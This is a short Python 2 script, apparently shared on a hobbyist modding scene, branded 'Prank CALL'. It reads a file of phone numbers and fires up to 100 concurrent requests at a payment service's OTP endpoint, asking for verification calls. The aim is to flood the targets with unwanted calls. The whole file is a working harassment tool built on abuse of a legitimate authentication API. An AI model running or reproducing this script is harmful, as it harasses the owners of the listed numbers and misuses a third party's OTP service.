print(
        "\n###################################################"
        "\n          Prank CALL"
        "\n     Mod By     : Gebang Kiidiw"
        "\n     Contact Me : gebangkiidiw@gmail.com"
        "\n     Blog       : www.gebangkiidiw.com"
        "\n     Youtube    : Gebang Kiidiw"
        "\n     Instagram  : @Bang_Joss24"
        "\n     Thanks To  : p4kl0nc4t"
        "\n###################################################"
)
import thread
import requests
import sys
try:
	file = sys.argv[1]
except:
	print("usage: {} <numbers_list>".format(sys.argv[0]))
	sys.exit()
numbers = open(sys.argv[1], "r").readlines()
count = 0
processc = 0
running_threads = 0
print_used = False
max_threads = 100
print("[-----info-----]: read {} numbers from {}".format(len(numbers), file))
def process(number):
	global running_threads
	global processc
	global print_used
	running_threads += 1
	number = number.rstrip()
	url = "https://www.tokocash.com/oauth/otp"
	data = {"msisdn": number.rstrip(), "accept": "call"}
	headers = {"X-Requested-With": "XMLHttpRequest"}
	r = requests.post(url, data=data, headers=headers)
	while print_used:
		pass
	print_used = True
	print("\r[0x" + str(thread.get_ident()) + "]: " + number + " (status: " + r.json()['code'] + ")")
	print_used = False
	processc += 1
	running_threads -= 1
	return 1
for number in numbers:
	while running_threads >= max_threads:
		pass
	if number == "" or number[0] == ";": continue
	count += 1
	thread.start_new_thread(process, ( number, ))
while processc != count:
	pass
print("[-----done-----]: Success!! CALL Meluncur :D Jangan Lupa Subscribe Gebang Kiidiw")
sys.exit()
